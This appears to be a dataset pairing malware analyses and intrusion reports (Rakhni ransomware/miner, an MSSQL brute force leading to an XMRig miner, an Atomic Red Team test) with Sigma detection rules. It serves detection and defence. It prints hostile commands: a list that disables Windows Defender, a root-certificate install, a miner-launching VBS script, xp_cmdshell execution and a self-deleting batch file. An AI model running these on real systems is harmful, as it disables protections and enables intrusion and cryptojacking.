file\nDescription: The image displays a terminal interface showing the contents of a directory related to a PE (Portable Executable) file. It lists three items: 'CERTM', 'CERTMGR', and 'RAREXE'. The context suggests that this is part of the resources contained in a downloader executable, possibly indicating components related to handling certificates and executable files, which are relevant in the discussion of the downloader's function in installing malicious certificates.\nTranscription: |\n  x                     Name\n  ..\n  CERTM\n  CERTMGR\n  RAREXE\n```\n\n*Resources contained in the downloader executable file*\n\nBefore installing the certificate, the downloader drops the necessary files from the resources to the `%TEMP%` directory.\n\n```image\nAlt: Fake certificate and CertMgr.exe utility\nDescription: The image displays a directory listing from a Windows file system, showing files located in the 'C:\\Users\\User\\AppData\\Local\\Temp' directory. Key elements highlighted include '179mqn7h0c.cer', which is a fake certificate file, 'AdobeReaderPlugin.exe', and 'CertMgr.exe', which is the utility used to install the certificate. The format resembles a command-line interface, with file names in different colors indicating various file types and statuses.\nTranscription: |\n  C:\\Users\\User\\AppData\\Local\\Temp\n  n                     Name\n  ..                    \n  CR_9AD3F.tmp        \n  Low                   \n  179mqn7h0c.cer      \n  AdobeReaderPlugin.exe\n  CertMgr.exe          \n  CVR50C.tmp.cvr      \n  CVRD4FD.tmp.cvr     \n  FXSAPIDebugLogFile.txt\n```\n\n*Fake certificate and CertMgr.exe utility*\n\nIt then executes the following command:\n\n*CertMgr.exe -add -c 179mqn7h0c.cer -s -r localMachine root*\n\n### The main decision\n\nThe decision to download the cryptor or the miner depends on the presence of the folder `%AppData%\\Bitcoin`. If the folder exists, the downloader decides to download the cryptor. If the folder doesn’t exist and the machine has more than two logical processors, the miner will be downloaded. If there’s no folder and just one logical processor, the downloader jumps to its worm component, which is described below in the corresponding part of the article.\n\n#### Cryptor decision\n\nThe Trojan downloads a password-protected archive that contains a cryptor module. The archive will be downloaded to the startup directory (`C:\\Documents and Settings\\username\\Start Menu\\Programs\\Startup`) and then the downloader will unpack it using the command line WinRAR tool. The cryptor executable will have the name `taskhost.exe`.\n\nAfter execution, the cryptor performs an environment check like the installer; in addition, it will check that it’s running after the downloader decision (by checking the registry value `HKCU\\Software\\Adobe\\DAVersion` is present).\n\nInterestingly, the cryptor only starts working if the system has been idle for at least two minutes. Before encrypting files, the cryptor terminates the following processes:\n\n| 1cv7s.exe     | Foxit Advanced PDF Editor.exe | mspaint.exe           | soffice.exe             |\n| ------------- | ----------------------------- | --------------------- | ----------------------- |\n| 1cv8.exe      | Foxit Phantom.exe             | mysqld.exe            | sqlservr.exe            |\n| 1cv8c.exe     | Foxit PhantomPDF.exe          | NitroPDF.exe          | sqlwriter.exe           |\n| 7zFM.exe      | Foxit Reader.exe              | notepad.exe           | STDUViewerApp.exe       |\n| acad.exe      | FoxitPhantom.exe              | OUTLOOK.EXE           | SumatraPDF.exe          |\n| Account.EXE   | FoxitReader.exe               | PDFMaster.exe         | thebat.exe              |\n| Acrobat.exe   | FreePDFReader.exe             | PDFXCview.exe         | thebat32.exe            |\n| AcroRd32.exe  | gimp-2.8.exe                  | PDFXEdit.exe          | thunderbird.exe         |\n| architect.exe | GSmeta.exe                    | pgctl.exe             | ThunderbirdPortable.exe |\n| bricscad.exe  | HamsterPDFReader.exe          | Photoshop.exe         | VISIO.EXE               |\n| Bridge.exe    | Illustrator.exe               | Picasa3.exe           | WebMoney.exe            |\n| CorelDRW.exe  | InDesign.exe                  | PicasaPhotoViewer.exe | WinDjView.exe           |\n| CorelPP.exe   | iview32.exe                   | postgres.exe          | WinRAR.exe              |\n| EXCEL.EXE     | KeePass.exe                   | POWERPNT.EXE          | WINWORD.EXE             |\n| fbguard.exe   | Magnat2.exe                   | RdrCEF.exe            | wlmail.exe              |\n| fbserver.exe  | MSACCESS.EXE                  | SmWiz.exe             | wordpad.exe             |\n| FineExec.exe  | msimn.exe                     | soffice.bin           | xnview.exe              |\n\nIn addition, if there is no `avp.exe` process running, the cryptor removes volume shadow copies.\n\nThe cryptor encrypts files with the following extensions:\n\n> “.ebd”, “.jbc”, “.pst”, “.ost”, “.tib”, “.tbk”, “.bak”, “.bac”, “.abk”, “.as4”, “.asd”, “.ashbak”, “.backup”, “.bck”, “.bdb”, “.bk1”, “.bkc”, “.bkf”, “.bkp”, “.boe”, “.bpa”, “.bpd”, “.bup”, “.cmb”, “.fbf”, “.fbw”, “.fh”, “.ful”, “.gho”, “.ipd”, “.nb7”, “.nba”, “.nbd”, “.nbf”, “.nbi”, “.nbu”, “.nco”, “.oeb”, “.old”, “.qic”, “.sn1”, “.sn2”, “.sna”, “.spi”, “.stg”, “.uci”, “.win”, “.xbk”, “.iso”, “.htm”, “.html”, “.mht”, “.p7”, “.p7c”, “.pem”, “.sgn”, “.sec”, “.cer”, “.csr”, “.djvu”, “.der”, “.stl”, “.crt”, “.p7b”, “.pfx”, “.fb”, “.fb2”, “.tif”, “.tiff”, “.pdf”, “.doc”, “.docx”, “.docm”, “.rtf”, “.xls”, “.xlsx”, “.xlsm”, “.ppt”, “.pptx”, “.ppsx”, “.txt”, “.cdr”, “.jpe”, “.jpg”, “.jpeg”, “.png”, “.bmp”, “.jiff”, “.jpf”, “.ply”, “.pov”, “.raw”, “.cf”, “.cfn”, “.tbn”, “.xcf”, “.xof”, “.key”, “.eml”, “.tbb”, “.dwf”, “.egg”, “.fc2”, “.fcz”, “.fg”, “.fp3”, “.pab”, “.oab”, “.psd”, “.psb”, “.pcx”, “.dwg”, “.dws”, “.dxe”, “.zip”, “.zipx”, “.7z”, “.rar”, “.rev”, “.afp”, “.bfa”, “.bpk”, “.bsk”, “.enc”, “.rzk”, “.rzx”, “.sef”, “.shy”, “.snk”, “.accdb”, “.ldf”, “.accdc”, “.adp”, “.dbc”, “.dbx”, “.dbf”, “.dbt”, “.dxl”, “.edb”, “.eql”, “.mdb”, “.mxl”, “.mdf”, “.sql”, “.sqlite”, “.sqlite3”, “.sqlitedb”, “.kdb”, “.kdbx”, “.1cd”, “.dt”, “.erf”, “.lgp”, “.md”, “.epf”, “.efb”, “.eis”, “.efn”, “.emd”, “.emr”, “.end”, “.eog”, “.erb”, “.ebn”, “.ebb”, “.prefab”, “.jif”, “.wor”, “.csv”, “.msg”, “.msf”, “.kwm”, “.pwm”, “.ai”, “.eps”, “.abd”, “.repx”, “.oxps”, “.dot”.\n\nAfter encryption the file extension will be changed to `.neitrino`.\n\nFiles are encrypted using an RSA-1024 encryption algorithm. The information necessary to decrypt the files is sent to the attacker by email.\n\nIn each encrypted directory, the cryptor creates a `MESSAGE.txt` file with the following contents:\n\n```image\nAlt: Ransom note\nDescription: The image shows a ransom note in a Notepad window, which includes instructions for the victim. The email address 'mr.anders@protonmail.com' is provided for contacting the attacker. There is a deadline for purchasing the decryption key, labeled as '21.06.2018', which is noted as the current date plus three days. Additionally, a user ID '4932965535' is highlighted, indicating that victims must include this ID in their communications. The text is in Russian, containing a warning against using third-party tools to decrypt files.\nTranscription: |\n  Запросить стоимости: mr.anders@protonmail.com  \n  Приобрести декриптор можно до 21.06.2018  \n  В ТЕМЕ письма укажите ваш ID: 4932965535  \n  Письма без указания ID игнорируются.  \n  \n  Убедительная просьба не пытаться расшифровать файлы сторонними инструментами.  \n  Вы можете их окончательно испортить и даже оригинальный декриптор не поможет.  \n  \n  Заявки обрабатываются автоматической системой.\n```\n\n*Ransom note*\n\n#### Miner decision\n\nThe downloading process of the miner is the same except for the downloading folder – the miner is saved to the path `%AppData%\\KB<8_random_chars>`, where `<8_random_chars>`, as the name suggests, is a string constructed from alphanumeric characters [0-9a-z].\n\nAfter downloading and unpacking the archive with the miner, the Trojan does the following:\n\n- Firstly, it generates a VBS script that will be launched after an OS reboot. The script has the name `Check_Updates.vbs`. This script contains two commands for mining:\n  - the first command will start a process to mine the cryptocurrency Monero;\n  - the second command will start a process to mine the cryptocurrency Monero Original. The name of the subfolder where the executable should be located (`cuda`) may indicate that this executable will use the GPU power for mining.\n\n```image\nAlt: Content of the Check_Updates.vbs file\nDescription: The image displays the content of a VBS (Visual Basic Script) file named 'Check_Updates.vbs', which is used by a malware downloader. It contains commands to execute a mining process for cryptocurrencies such as Monero and Dashcoin. The script initiates a shell object and runs the 'svchost.exe' executable located in a specific folder within the AppData directory, along with parameters for mining. The commands include user details and mining pool information, indicative of a malicious operation leveraging the system's resources for cryptocurrency mining.\nTranscription: |\n  C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Check_Updates.vbs\n  Set objShell = CreateObject(\"WScript.Shell\")\n  objShell.Run \"C:\\Users\\User\\AppData\\Roaming\\KBf16n1hdy\\svchost.exe -user donovan@protonmail.com -wmr 1\", 0, False\n  objShell.Run \"C:\\Users\\User\\AppData\\Roaming\\KBf16n1hdy\\cuda\\svchost.exe -d -i auto -a cryptonight\"\n  stratum = \"stratum+tcp://www.pool.minergate.com:45560 -u donovan@protonmail.com -p c=SIB,stats --cpu-priority=3\", 0, False\n```\n\n*Content of the Check_Updates.vbs file*\n\n- Then, if there is a file named `%AppData%\\KB<8_random_chars>\\svchost.exe`, the Trojan executes it to mine the cryptocurrency Dashcoin.\n\n```image\nAlt: Process for mining the Dashcoin cryptocurrency\nDescription: The image is a screenshot from a process monitoring tool, showing a list of running processes on a Windows system. It highlights the process named 'svchost.exe', which is located in the path 'C:\\Users\\User\\AppData\\Roaming\\KB<8_random_chars>\\svchost.exe'. This process appears to be executing a command that includes a user email and a parameter '-dsh', indicating it may be connected to cryptocurrency mining activities. The screenshot also displays various other processes and their resource usage, indicating that 'svchost.exe' is consuming a significant amount of CPU resources (96.99%). This visual representation supports the context of the mining Trojan discussed in the related text.\nTranscription: |\n  AdobeReaderPlugin.exe    < 0.01    5.292 K     12.928 K    3956  Adobe Plugin                 Adobe\n  ----cmd.exe                        2.016 K     3.120 K     1604  Windows Command Processor    Microsoft Corporation\n  ----svchost.exe          96.99     12.000 K    12.700 K    3344  Windows Command Processor    Microsoft Corporation\n  cmd.exe                            2.012 K     3.116 K     2096  Windows Command Processor    Microsoft Corporation\n  \n  Command Line: \n  \"C:\\Users\\User\\AppData\\Roaming\\KB16n\\indy\\svchost.exe\" -user donovan@protonmail.com -dsh\n  Path: \n  C:\\Users\\User\\AppData\\Roaming\\KB16n\\indy\\svchost.exe\n```\n\n*Process for mining the Dashcoin cryptocurrency*\n\nWhen this analysis was carried out, the downloader was receiving an archive with a miner that didn’t use the GPU. The attacker uses the console version of the MinerGate utility for mining.\n\n```image\nAlt: Checking the utility for mining\nDescription: The image displays a command line interface showing the execution of a file named `svchost.exe` located in the user's application data folder. The command used is `-version`, which outputs the version of the MinerGate application, indicating it is version 4.04. This suggests the file is being utilized for cryptocurrency mining, specifically for Monero or Dashcoin, as described in the context. The path also contains a randomly generated string, which hints at potential malware behavior.\nTranscription: |\n  C:\\Users\\User\\AppData\\Roaming\\KBf16n1hdy>svchost.exe -version\n  MinerGate v.4.04\n  \n  C:\\Users\\User\\AppData\\Roaming\\KBf16n1hdy>\n```\n\n*Checking the utility for mining*\n\nIn order to disguise the miner as a trusted process, the attacker signs it with a fake Microsoft Corporation certificate and calls `svchost.exe`.\n\n### Disabling of Windows Defender\n\nRegardless of whether the cryptor or the miner was chosen, the downloader checks if one of the following AV processes is launched:\n\n| 360DocProtect.exe | avgui.exe                | dwservice.exe        | McUICnt.exe                 |\n| ----------------- | ------------------------ | -------------------- | --------------------------- |\n| 360webshield.exe  | avgwdsvc.exe             | dwwatcher.exe        | mcupdate.exe                |\n| AvastSvc.exe      | Avira.OE.ServiceHost.exe | egui.exe             | ProtectionUtilSurrogate.exe |\n| AvastUI.exe       | Avira.OE.Systray.exe     | ekrn.exe             | QHActiveDefense.exe         |\n| avgcsrva.exe      | Avira.ServiceHost.exe    | kav.exe              | QHSafeTray.exe              |\n| avgemca.exe       | Avira.Systray.exe        | LUALL.exe            | QHWatchdog.exe              |\n| avgidsagent.exe   | avp.exe                  | LuComServer.exe      | Rtvscan.exe                 |\n| avgnsa.exe        | ccApp.exe                | McCSPServiceHost.exe | SMC.exe                     |\n| avgnt.exe         | ccSvcHst.exe             | McPvTray.exe         | SMCgui.exe                  |\n| avgrsa.exe        | Dumpuper.exe             | McSACore.exe         | spideragent.exe             |\n| avgrsx.exe        | dwengine.exe             | mcshield.exe         | SymCorpUI.exe               |\n| avguard.exe       | dwnetfilter.exe          | McSvHost.exe         |                             |\n\nIf no AV process was found in the system, the Trojan will run several cmd commands that will disable Windows Defender in the system:\n\n- `cmd /C powershell Set-MpPreference -DisableRealtimeMonitoring $true`\n- `cmd /C powershell Set-MpPreference -MAPSReporting 0`\n- `cmd /C powershell Set-MpPreference -SubmitSamplesConsent 2`\n- `taskkill /IM MSASCuiL.exe`\n- `cmd /C REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v HideSCAHealth /t REGDWORD /d 1 /f`\n- `cmd /C REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REGDWORD /d 1 /f`\n- `cmd /C REG DELETE HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f`\n- `cmd /C REG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REGDWORD /d 1 /f`\n- `cmd /C REG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v AllowFastServiceStartup /t REGDWORD /d 0 /f`\n- `cmd /C REG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v ServiceKeepAlive /t REGDWORD /d 0 /f`\n- `cmd /C REG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableIOAVProtection /t REGDWORD /d 1 /f`\n- `cmd /C REG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableRealtimeMonitoring /t REGDWORD /d 1 /f`\n- `cmd /C REG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet /v DisableBlockAtFirstSeen /t REGDWORD /d 1 /f`\n- `cmd /C REG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet /v LocalSettingOverrideSpynetReporting /t REGDWORD /d 0 /f`\n- `cmd /C REG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet /v SubmitSamplesConsent /t REGDWORD /d 2 /f`\n- `cmd /C REG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration /v NotificationSuppress /t REGDWORD /d 1 /f`\n\n### Sending the statistics\n\nDuring their operation the downloader and cryptor modules send emails with statistics to a hardcoded address. These messages contain information about the current state of infection and other details such as:\n\n- computer name;\n- victim IP address;\n- path of malware in the system;\n- current date and time;\n- malware build date.\n\nThe downloader sends the following states:\n\n| Hello Install     | Sent after the cryptor or miner is downloaded                             |\n| ----------------- | ------------------------------------------------------------------------- |\n| Hello NTWRK       | Sent after the downloader attempts to spread through the victim’s network |\n| Error <errorcode> | Sent if something goes wrong and contains the error code value            |\n\nThe cryptor sends the following states:\n\n| Locked | Shows that the cryptor was launched                     |\n| ------ | ------------------------------------------------------- |\n| Final  | Shows that the cryptor has ended the encryption process |\n\nAnother interesting fact is that the downloader also has some spyware functionality – its messages include a list of running processes and an attachment with a screenshot.\n\n## Worm component\n\nAs one of its last actions the downloader tries to copy itself to all the computers in the local network. To do so, it calls the system command `net view /all` which will return all the shares and then the Trojan creates the `list.log` file containing the names of computers with shared resources. For each computer listed in the file the Trojan checks if the folder `Users` is shared and, if so, the malware copies itself to the folder `\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup` of each accessible user.\n\n## Self-deleting\n\nBefore shutting down the malware creates a batch file that deletes all ‘temporary’ files created during the infection process. This is a common practice for malware. The thing that interested us was the use of the Goto label ‘malner’. Perhaps this is a portmanteau of the words ‘malware’ and ‘miner’ used by the criminal.\n\n```image\nAlt: Content of the svchost.bat file\nDescription: The image displays the content of a batch file named 'svchost.bat'. The script is designed to delete various temporary files created during a malware infection process. It includes commands to delete specific file types from the user's Temp directory and the Downloads folder, as well as a loop using the Goto label 'malner' which is likely a play on the words 'malware' and 'miner'. The batch file also includes a command to ping the local host to create a delay before the deletion occurs.\nTranscription: |\n  C:\\Users\\User\\AppData\\Local\\Temp\\svchost.bat\n  :malner\n  del \"C:\\Users\\User\\AppData\\Local\\Temp\\AdobeReaderPlugin.exe\"\n  if exist \"C:\\Users\\User\\AppData\\Local\\Temp\\AdobeReaderPlugin.exe\" (\n  ping -n 2 127.0.0.1 > nul\n  Goto malner)\n  del \"C:\\Users\\User\\AppData\\Local\\Temp\\*.cer\"\n  del \"C:\\Users\\User\\AppData\\Local\\Temp\\*.docx\"\n  del \"C:\\Users\\User\\AppData\\Local\\Temp\\Rar.exe\"\n  del \"C:\\Users\\User\\AppData\\Local\\Temp\\Adobe*.exe\"\n  del \"C:\\Users\\User\\AppData\\Local\\Temp\\*.cer\"\n  del \"C:\\Users\\User\\AppData\\Local\\Temp\\*.docx\"\n  del \"C:\\Users\\User\\AppData\\Local\\Temp\\Rar.exe\"\n  del \"C:\\Users\\User\\AppData\\Local\\Roaming\\Downloads\\*.docx\"\n  del \"C:\\Users\\User\\AppData\\Local\\Temp\\svchost.bat\"\n```\n\n*Content of the svchost.bat file*\n\n## Detection verdicts\n\nOur products detect the malware described here with the following verdicts:\n\n- Downloader: Trojan-Downloader.Win32.Rakhni.pwc\n- Miner: not-a-virus:RiskTool.Win32.BitCoinMiner.iauu\n- Cryptor: Trojan-Ransom.Win32.Rakhni.wbrf\n\nIn addition, all the malware samples are detected by the System Watcher component.\n\n## IoCs\n\nMalicious document: `81C0DEDFA5CB858540D3DF459018172A` \nDownloader: `F4EC1E3270D62DD4D542F286797877E3` \nMiner: `BFF4503FF1650D8680F8E217E899C8F4` \nCryptor: `96F460D5598269F45BCEAAED81F42E9B`\n\n**URLs**\n\n- hxxp://protnex[.]pw\n- hxxp://biserdio[.]pw",
    "sigma_rule": {
      "title": "New Root Certificate Installed Via CertMgr.EXE",
      "id": "ff992eac-6449-4c60-8c1d-91c9722a1d48",
      "related": [
        {
          "id": "42821614-9264-4761-acfc-5772c3286f76",
          "type": "derived"
        },
        {
          "id": "46591fae-7a4c-46ea-aec3-dff5e6d785dc",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"certmgr\" with the \"add\" flag in order to install a new certificate on the system.\nAdversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md",
        "https://securelist.com/to-crypt-or-to-mine-that-is-the-question/86307/"
      ],
      "author": "oscd.community, @redcanary, Zach Stanford @svch0st",
      "date": "2023-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1553.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\CertMgr.exe"
          },
          {
            "OriginalFileName": "CERTMGT.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "/add",
            "root"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_certmgr_certificate_installation.yml",
    "id": "95"
  },
  {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1003.005/T1003.005.md#atomic-test-1---cached-credential-dump-via-cmdkey",
    "markdown": "# T1003.005 - OS Credential Dumping: Cached Domain Credentials\n\n## Description from ATT&CK\n\nAdversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable. (Citation: Microsoft - Cached Creds)\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. (Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password. (Citation: ired mscache)\n\nWith SYSTEM access, tools/utilities such as Mimikatz, Reg, and secretsdump.py can be used to extract the cached credentials.\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2. (Citation: PassLib mscache)\n\n## Atomic Tests\n\n- Atomic Test #1 - Cached Credential Dump via Cmdkey\n\n### Atomic Test #1 - Cached Credential Dump via Cmdkey\n\nList credentials currently stored on the host via the built-in Windows utility `cmdkey.exe`. Credentials listed with Cmdkey only pertain to the current user. Passwords will not be displayed once they are stored.\n\n- Cmdkey Documentation\n- Exploring Cmdkey\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 56506854-89d6-46a3-9804-b7fde90791f9\n\n#### Attack Commands: Run with `command_prompt`!\n\n```\ncmdkey /list\n```",
    "sigma_rule": {
      "title": "Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE",
      "id": "07f8bdc2-c9b3-472a-9817-5a670b872f53",
      "status": "test",
      "description": "Detects usage of cmdkey to look for cached credentials on the system",
      "references": [
        "https://web.archive.org/web/20230130005118/https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754243(v=ws.11)",
        "https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1003.005/T1003.005.md#atomic-test-1---cached-credential-dump-via-cmdkey"
      ],
      "author": "jmallette, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2024-03-05",
      "tags": [
        "attack.credential-access",
        "attack.t1003.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cmdkey.exe"
          },
          {
            "OriginalFileName": "cmdkey.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -l"
        },
        "condition": "all of selection*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine",
        "User"
      ],
      "falsepositives": [
        "Legitimate administrative tasks"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmdkey_recon.yml",
    "id": "103"
  },
  {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackbyte-exbyte-ransomware",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Ping/Del Command Combination",
      "id": "54786ddc-5b8a-11ed-9b6a-0242ac120002",
      "status": "test",
      "description": "Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example",
      "references": [
        "https://blog.sygnia.co/kaseya-ransomware-supply-chain-attack",
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/06/23093553/Common-TTPs-of-the-modern-ransomware_low-res.pdf",
        "https://www.acronis.com/en-us/blog/posts/lockbit-ransomware/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackbyte-exbyte-ransomware"
      ],
      "author": "Ilya Krestinichev",
      "date": "2022-11-03",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_count": {
          "CommandLine|contains|windash": " -n "
        },
        "selection_nul": {
          "CommandLine|contains": "Nul"
        },
        "selection_del_param": {
          "CommandLine|contains|windash": [
            " -f ",
            " -q "
          ]
        },
        "selection_all": {
          "CommandLine|contains|all": [
            "ping",
            "del "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmd_ping_del_combined_execution.yml",
    "id": "109"
  },
  {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer\n\n**Categories:** coinminer, exploit \n**Published Date:** July 11, 2022 \n\n---\n\nIn March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting.\n\nUS CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link).\n\n---\n\n## Summary\n\nOver the month of March, we observed a cluster of activity targeting MSSQL servers. The activity started via password brute force attempts for the MSSQL SA account. These brute force attempts were observed repeatedly over the month. Examples included one cluster of 24,000 failed attempts from the same source, over a 27-hour effort, before they finally managed to guess the password. After obtaining the correct credentials, the attackers spawned a command shell via `xp_cmdshell`. According to Microsoft documentation, `xp_cmdshell` spawns a Windows command shell and passes in a string for execution.\n\nUsing `xp_cmdshell`, the threat actors were able to execute any command against the compromised server. They attempted to kill a bunch of AV programs by using `taskkill.exe`. The threat actors then wrote multiple commands to a batch file by using `echo` and redirecting the strings to a file named `1.bat`. After the batch file was written, they proceeded to perform the same action echoing data into a file named `bigfile.txt`. After finishing writing to that file, they ran `certutil` to decode the base64 data into an executable file. This executable was a privilege escalation tool used to execute the batch file to ensure it executed with high enough permissions. They then executed the batch script. The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.\n\nOnce the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner. They dropped a Binary Managed Object Format (BMOF) file along with the miner itself to achieve this. The threat actors used `mofcomp.exe` to decompile the BMOF binary and register a malicious class in the WMI repository. The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.\n\nNo other activity beyond the mining was observed before the threat actors were evicted.\n\n---\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, Sliver, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nArtifacts for this case are limited due to the environment. A few log sources are available for this case under our Security Researcher and Organization services.\n\n---\n\n## Initial Access\n\nThe initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.\n\nDuring the intrusions, we could see SQL Server event ID **18456** Failure Audit Events in the Windows application logs. We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.\n\n### Example of the failed brute force attempts:\n\n```image\nAlt: Failed Attempts\nDescription: The image displays a series of failed login attempts to a SQL Server, showing usernames and the corresponding reasons for failure. Each entry indicates whether the password did not match or the login could not be found. The usernames include common administrative names like 'sa' and 'admin,' highlighting potential brute force attack attempts.\nTranscription: |\n  sa | Reason: Password did not match that for the login provided. |\n  hbv7 | Reason: Could not find a login matching the name provided. |\n  su | Reason: Could not find a login matching the name provided. |\n  ps | Reason: Could not find a login matching the name provided. |\n  vice | Reason: Could not find a login matching the name provided. |\n  kisadmin | Reason: Could not find a login matching the name provided. |\n  401hk | Reason: Could not find a login matching the name provided. |\n  sysdba | Reason: Could not find a login matching the name provided. |\n  admin | Reason: Password did not match that for the login provided. |\n  uep | Reason: Could not find a login matching the name provided. |\n  bizbox | Reason: Could not find a login matching the name provided. |\n  neterp | Reason: Could not find a login matching the name provided. |\n  unierp | Reason: Could not find a login matching the name provided. |\n  sp | Reason: Could not find a login matching the name provided. |\n  root | Reason: Password did not match that for the login provided. |\n  bwsa | Reason: Could not find a login matching the name provided. |\n```\n\n### Followed by eventual successful logins:\n\n```image\nAlt: Successful Logins\nDescription: The image depicts a table displaying SQL Server audit events. It includes columns such as 'TimeWritten,' 'EventID,' 'EventTypeName,' 'EventCategory,' 'SourceName,' and 'Strings,' showing multiple entries for successful audit events. The entries indicate the timestamps of the events, the event type as 'Success Audit event,' and the source name as 'MSSQL$SQLEXPRESS,' suggesting automated access attempts by the threat actor.\nTranscription: |\n  | TimeWritten      | EventID | EventT | EventTypeName       | EventC | SourceName       | Strings       |\n  | ---------------- | ------- | ------ | ------------------- | ------ | ---------------- | ------------- |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:01 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n```\n\nIt is likely that multiple successful logins were observed due to the automated access script that the threat actor was using.\n\n---\n\n## Execution\n\nIn the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (`xp_cmdshell`). This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.\n\n### Example of command execution following a successful authentication to SQL database using `xp_cmdshell`:\n\n```\nEXEC xp_cmdshell 'whoami'\n```\n\nAt a high level, the overall execution events can be depicted in the below diagram:\n\n```image\nAlt: Execution Diagram\nDescription: The image is a flow diagram illustrating the execution events following a successful brute-force attack against a SQL Server. It details the steps from authentication via brute force, the use of the command shell via `xp_cmdshell`, writing various scripts and files to disk, compiling a MOF file, and killing antivirus processes. The diagram includes visual elements like boxes and arrows showing the progression of actions taken by threat actors, such as adding local administrator accounts and setting up a scheduled task for running XMRig CoinMiner.\nTranscription: |\n  START\n    Brute-Force Attack Against SQL Server\n      Successful Authentication via Brute Force Attack\n        Command Shell via xp_cmdshell\n          Writes 1.bat, and bigfile.txt to disk\n            decodes bigfile.txt with certutil into bigfile.exe\n              bigfile.exe used to run 